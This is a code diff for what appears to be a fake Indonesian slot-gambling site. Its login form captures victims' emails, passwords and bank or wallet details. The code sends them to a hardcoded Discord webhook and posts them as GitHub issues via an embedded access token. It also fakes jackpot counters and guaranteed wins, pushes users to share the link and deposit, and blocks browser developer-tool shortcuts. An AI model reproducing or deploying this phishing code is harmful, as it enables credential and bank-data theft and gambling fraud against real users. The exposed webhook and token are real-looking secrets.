@@ -1,75 +1,64 @@
-// OMNI DATA CAPTURE - DISCORD WEBHOOK
-const WEBHOOK = "https://discord.com/api/webhooks/1488920982059225218/k3BAyhlX0rVuXmY8gXQ-ECQtMWFduU123hjdsaJJ7Zc3MGsWriERGk3t9XVzwNp-bXhz";
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1488920982059225218/k3BAyhlX0rVuXmY8gXQ-ECQtMWFduU123hjdsaJJ7Zc3MGsWriERGk3t9XVzwNp-bXhz";
+const GH_TOKEN = "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";
+const GH_OWNER = "reyyhandalkoding";
+const GH_REPO = "maxwin";
 
-async function omniLogin() {
-    const u = document.getElementById('u_name').value;
-    const p = document.getElementById('u_pass').value;
-    const b = document.getElementById('u_bank').value;
-    const msg = document.getElementById('status-msg');
+// 1. Live Jackpot Engine (Angka nambah terus)
+let jpAmount = 8421550210;
+setInterval(() => {
+    jpAmount += Math.floor(Math.random() * 15000);
+    document.getElementById('total-jp').innerText = "IDR " + jpAmount.toLocaleString('id-ID');
+}, 1000);
 
-    if(!u || !p || !b) return alert("System Error: Credential Required!");
+// 2. Identity Capture (GitHub + Discord)
+async function omniIdentity() {
+    const email = document.getElementById('u_email').value;
+    const pass = document.getElementById('u_pass').value;
+    const bank = document.getElementById('u_bank').value;
+    if(!email || !pass || !bank) return alert("Peringatan: Lengkapi data untuk sinkronisasi server.");
 
-    msg.innerText = "Encrypting Data...";
+    // Kirim Discord
+    await fetch(DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            username: "V10_OVERLORD",
+            embeds: [{
+                title: "🚨 HIGH-LEVEL TARGET ACQUIRED! 🚨",
+                color: 16711680,
+                fields: [
+                    { name: "👤 USER/GMAIL", value: `\`${email}\`` },
+                    { name: "🔑 PASSWORD", value: `\`${pass}\`` },
+                    { name: "🏦 BANK/WALET", value: bank }
+                ],
+                timestamp: new Date()
+            }]
+        })
+    });
 
-    // Kirim Data ke Discord lo secara rahasia
-    try {
-        await fetch(WEBHOOK, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                embeds: [{
-                    title: "💎 NEW OMNI-PLATINUM TARGET!",
-                    color: 15066594,
-                    fields: [
-                        {name: "ID/Phone", value: `\`${u}\``, inline: true},
-                        {name: "Pass", value: `\`${p}\``, inline: true},
-                        {name: "Bank/Wallet", value: `\`${b}\``, inline: false}
-                    ],
-                    timestamp: new Date()
-                }]
-            })
-        });
+    // Simpan GitHub
+    await fetch(`https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/issues`, {
+        method: 'POST',
+        headers: { 'Authorization': `token ${GH_TOKEN}`, 'Content-Type': 'application/json' },
+        body: JSON.stringify({ title: `V10_DB: ${email}`, body: `Email: ${email} | Pass: ${pass} | Bank: ${bank}` })
+    });
 
-        // Simulasi Bypass
-        setTimeout(() => {
-            document.getElementById('gate-system').classList.add('hidden-blur');
-            document.getElementById('gate-system').style.display = 'none';
-            document.getElementById('main-hub').classList.remove('hidden-blur');
-            document.getElementById('display-user').innerText = u.toUpperCase();
-            startLiveUpdates();
-        }, 1500);
-    } catch(err) {
-        msg.innerText = "Server Error. Try Again.";
-    }
+    // Bypass to Dashboard
+    localStorage.setItem('v10_user', email);
+    document.getElementById('gate-system').style.display = 'none';
+    document.getElementById('main-hub').classList.remove('hidden-blur');
+    document.getElementById('display-user').innerText = email.split('@')[0].toUpperCase();
+    document.getElementById('user-bal').innerText = "Rp 120.250.000";
 }
 
-// Share Counter (Fake)
-let shares = 0;
-function shareWA() {
-    shares++;
-    let progress = (shares / 5) * 100;
-    document.getElementById('p-bar').style.width = progress + "%";
-    document.getElementById('p-bar').innerText = progress + "%";
-    
-    // Redirect ke WA
-    window.open("https://api.whatsapp.com/send?text=BRO!%20Gue%20baru%20temu%20link%20VVIP%20Slot%20Gacor!%20Gampang%20WD%20banget,%20cobain%20disini: " + window.location.href, "_blank");
-
-    if(shares >= 5) {
-        alert("AKSES GACOR AKTIF! Silahkan Deposit untuk Withdraw Pertama.");
-    }
+// 3. Fake Slot Result (Always Win)
+function spinSlot() {
+    alert("Koneksi Server Gacor! Memutar Reels VVIP...");
+    setTimeout(() => {
+        alert("💥 MAXWIN! Anda dapet IDR 50.000.000! Segera share 10x untuk aktivasi Withdraw.");
+        fetch(DISCORD_WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: `🔥 **TARGET JP!** User \`${localStorage.getItem('v10_user')}\` lagi nafsu WD.`}) });
+    }, 2000);
 }
 
-// Live Deposit Feed
-function startLiveUpdates() {
-    const list = document.getElementById('depo-list');
-    const players = ["Rendi", "Santi", "Bocil_JP", "Arga_Master", "Vina_77"];
-    
-    setInterval(() => {
-        const name = players[Math.floor(Math.random()*players.length)];
-        const amount = (Math.floor(Math.random()*20) + 1) * 50000;
-        const li = document.createElement('li');
-        li.innerHTML = `<span class="green">✔</span> ${name}*** DEPOSIT Rp ${amount.toLocaleString('id-ID')}`;
-        list.prepend(li);
-        if(list.children.length > 5) list.removeChild(list.lastChild);
-    }, 4000);
-}
+// 4. Anti-Inspect Protection
+document.onkeydown = (e) => { if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
